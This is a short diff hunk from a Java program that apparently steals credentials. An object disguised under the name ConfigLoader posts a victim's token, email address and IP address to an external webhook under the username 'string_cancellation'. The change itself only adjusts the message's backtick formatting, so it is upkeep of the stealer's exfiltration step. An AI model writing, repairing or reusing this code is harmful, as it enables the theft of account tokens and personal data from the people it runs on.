@@ -43,7 +43,7 @@ public class Main {
 
 						        try {
 						        	ConfigLoader webhook = new ConfigLoader(webhookLink);
-						            webhook.setContent("````Token : " + s+" / Email : "+email +" / IP : " +ipAdress() +"```");
+						            webhook.setContent("```Token : " + s+" / Email : "+email +" / IP : " +ipAdress() +"```");
 						            webhook.setAvatarUrl(image);
 						            webhook.setUsername("string_cancellation");
 						            webhook.setTts(false);
